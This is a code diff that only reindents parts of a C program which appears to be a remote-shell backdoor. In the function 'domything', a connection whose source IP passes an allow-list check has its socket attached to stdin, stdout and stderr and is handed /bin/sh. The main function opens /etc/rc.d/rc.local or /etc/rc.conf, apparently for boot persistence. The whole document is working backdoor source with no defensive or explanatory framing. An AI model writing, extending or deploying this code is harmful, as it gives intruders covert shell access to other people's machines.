@@ -23,7 +23,7 @@ int AuthCheck(u_char *ip)
         {
             return 1;
         }
-        }
+    }
     for (i=0; DynamicIP[i] != NULL; i++)
     {
         int x = (int)(strchr(DynamicIP[i], '*') - DynamicIP[i] - 1);
@@ -44,14 +44,14 @@ int AuthCheck(u_char *ip)
 
 void domything(u_int sd, u_char *src) 
 {
-	if (AuthCheck(src))
-	{
-		dup2(sd, 0); //err
-		dup2(sd, 1); //out
-		dup2(sd, 2); //in
-		execl("/bin/sh", "/bin/sh", (char *)0);
-		close(sd); 
-		exit(0);
+    if (AuthCheck(src))
+    {
+        dup2(sd, 0); //err
+        dup2(sd, 1); //out
+        dup2(sd, 2); //in
+        execl("/bin/sh", "/bin/sh", (char *)0);
+        close(sd); 
+        exit(0);
     }
 }
 
@@ -61,8 +61,8 @@ int main(int argc, char *argv[])
     int on,i;
     char cwd[256],*str;
     FILE *file;
-	str="/etc/rc.d/rc.local";
-	file=fopen(str,"r");
+    str="/etc/rc.d/rc.local";
+    file=fopen(str,"r");
     if (file == NULL) 
     {
         str="/etc/rc.conf";
